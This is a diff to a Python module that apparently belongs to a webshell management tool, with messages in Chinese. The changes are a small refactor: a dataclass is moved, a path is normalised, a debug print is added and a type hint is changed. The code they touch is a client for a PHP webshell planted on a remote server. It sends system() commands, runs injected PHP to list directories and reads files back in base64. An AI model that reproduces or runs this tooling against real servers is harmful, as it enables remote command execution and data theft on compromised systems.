@@ -7,7 +7,7 @@ import json
 from dataclasses import dataclass
 import httpx
 from ..utils import random_english_words
-from .base import Session
+from .base import Session, DirectoryEntry
 from .exceptions import *
 
 logger = logging.getLogger("sessions.php")
@@ -26,13 +26,6 @@ class PHPWebshellOptions:
 
     encoder: t.Literal["raw", "base64"] = "raw"
     http_params_obfs: bool = False
-
-
-@dataclass
-class DirectoryEntry:
-    name: str
-    permission: str
-    entry_type: t.Literal["directory", "file", "unknown"] = "file"
 
 
 
@@ -55,6 +48,7 @@ class PHPWebshellMixin:
         return await self.submit(f"system({cmd!r});")
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
+        dir_path = dir_path.removesuffix("/") + "/"
         php_code = """
         error_reporting(0);
         $folderPath = DIR_PATH;
@@ -75,6 +69,7 @@ class PHPWebshellMixin:
             "DIR_PATH", repr(dir_path)
         )
         json_result = await self.submit(php_code)
+        print(repr(dir_path), json_result)
         try:
             result = json.loads(json_result)
         except json.JSONDecodeError as exc:
@@ -111,7 +106,7 @@ class PHPWebshellMixin:
             raise FileError("没有权限读取这个文件")
         return base64.b64decode(result)
 
-    async def get_pwd(self) -> t.Union[str, None]:
+    async def get_pwd(self) -> str:
         """获取当前文件夹"""
         return await self.submit("echo __DIR__;")
 
